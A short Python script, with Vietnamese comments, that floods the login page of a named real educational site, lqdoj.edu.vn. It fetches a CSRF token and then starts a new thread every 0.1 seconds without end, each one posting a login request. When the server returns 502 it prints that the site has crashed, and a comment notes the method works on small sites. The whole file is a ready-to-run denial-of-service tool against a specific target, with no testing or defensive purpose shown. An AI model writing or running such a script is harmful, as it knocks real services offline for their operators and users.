import requests
import time
import threading

url = "https://lqdoj.edu.vn/accounts/login"
csrftoken = requests.get(url).cookies.get_dict()['csrftoken']

def dang_nhap(): # Không nền dùng cái này với LQDOJ, vì cái này đánh được mấy web nhỏ thôi, web lớn chịu
    try:
        body = {
            'csrfmiddlewaretoken': csrftoken,
            # Tự thay username với mật khẩu
            'username': "",
            'password': '',
        }
        response = requests.post(url, data=body)
        print(response.status_code)
        if response.status_code == 502:
            print("Web đã sập")
    except:
        pass

while True:
    threading.Thread(target=dang_nhap).start()
    time.sleep(0.1)